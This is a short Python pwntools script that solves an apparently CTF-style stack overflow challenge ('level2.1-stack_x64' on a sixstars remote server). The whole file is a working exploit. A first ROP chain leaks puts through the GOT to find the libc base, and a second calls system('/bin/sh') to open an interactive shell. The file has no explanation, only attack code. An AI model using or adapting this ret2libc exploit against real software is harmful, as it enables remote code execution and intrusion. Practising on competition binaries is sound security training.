from pwn import *
context.log_level="debug"

r=remote("pwn.sixstars.team",23002)
elf=ELF("./level2.1-stack_x64")
libc=ELF("./libc.so.6")

prdi=0x0000000000400703
main=0x0000000000400656

r.recv()
r.sendline('a'*0x28+p64(prdi)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(main))

a=r.recv(6)+'\x00'+'\x00'
a=u64(a)-libc.sym['puts']
print hex(a)

libc.address=a
prsi=a+0x00000000000202e8
prdx=a+0x0000000000001b92
binsh=a+0x000000000018cd57
sys=libc.sym['system']

r.recv()
r.sendline('a'*0x28+p64(prdi)+p64(binsh)+p64(prsi)+p64(0)+p64(prdx)+p64(0)+p64(sys))

r.interactive()
